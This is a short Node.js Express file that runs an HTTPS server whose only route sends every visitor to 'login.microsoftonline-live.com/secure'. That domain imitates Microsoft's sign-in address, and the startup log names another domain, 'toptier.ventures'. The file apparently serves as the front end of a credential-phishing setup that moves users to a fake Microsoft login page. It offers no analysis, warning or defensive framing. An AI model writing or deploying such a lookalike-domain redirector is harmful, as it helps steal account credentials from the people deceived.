const fs = require('fs');
const https = require('https');
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// SSL Certificate paths
const privateKey = fs.readFileSync('path/to/privateKey.key', 'utf8');
const certificate = fs.readFileSync('path/to/certificate.crt', 'utf8');
const credentials = { key: privateKey, cert: certificate };

const port = 3001;

app.get('/', (req, res) => {
  setTimeout(() => {
      res.redirect('https://login.microsoftonline-live.com/secure');
  }, 10);
});

const httpsServer = https.createServer(credentials, app);

httpsServer.listen(port, '0.0.0.0', () => {
  console.log(`Proxy server listening at https://www.toptier.ventures:${port}`);
});
